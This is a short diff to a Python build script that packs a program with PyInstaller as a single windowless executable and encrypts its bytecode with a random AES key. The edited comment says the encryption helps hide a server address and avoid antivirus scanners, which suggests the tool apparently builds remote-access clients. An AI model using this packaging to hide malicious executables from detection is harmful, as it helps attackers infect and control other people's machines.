@@ -74,10 +74,9 @@ def compile_src(
     command += "-F --clean --noconsole --disable-windowed-traceback --log-level ERROR "
 
     # encrypt compiled byte code with a random 128 bit aes key,
-    # this will help hiding the server address in the executable
-    # since single file pyinstaller executables will extract themself
-    # to a temporary folder when executed and if not using a key the
-    # byte code is easy to decompile and reveal information
+    # this can help avoid AV scanners by not directly revealing
+    # the bytecode of the packaged executable. However, the byte
+    # code can easily be decompiled and decrypted  with tools.
     aes_key = sha256(os.urandom(4096)).hexdigest()[:16]
     command += f"--key {aes_key}"
 
